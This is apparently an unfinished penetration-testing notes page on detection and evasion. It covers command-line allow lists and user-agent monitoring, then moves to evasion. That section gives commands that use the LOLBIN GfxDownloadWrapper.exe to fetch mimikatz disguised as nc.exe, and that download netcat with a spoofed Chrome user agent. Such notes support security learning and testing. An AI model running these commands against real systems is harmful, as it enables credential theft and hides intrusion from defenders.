# Detection
- This page is not finished

## Command Line Detection
- command line detection by blacklisting can be bypasses
- command line detection by whitelisting is quite robust but can take a lot of work at first

## HTTP: User Agent
- this website helps to identify user agent strings: https://useragentstring.com/index.php

User agents are not only used to identify web browsers, but anything acting as an HTTP client and connecting to a web server via HTTP can have a user agent string (i.e., cURL, a custom Python script, or common tools such as sqlmap, or Nmap).

Organizations can identify potential user agent strings by first building a list of legitimate user agent strings, user agents used by system processes, update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. 

# Evading Detection
## Evade Application Whitelisting
- https://gtfobins.github.io/
- https://lolbas-project.github.io/
- Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence.
- In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries."

### Transferring File with GfxDownloadWrapper.exe

```shell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

## User Agents can be Changed
```shell 
#get a list of user agents:
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

#Change the User Agent
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```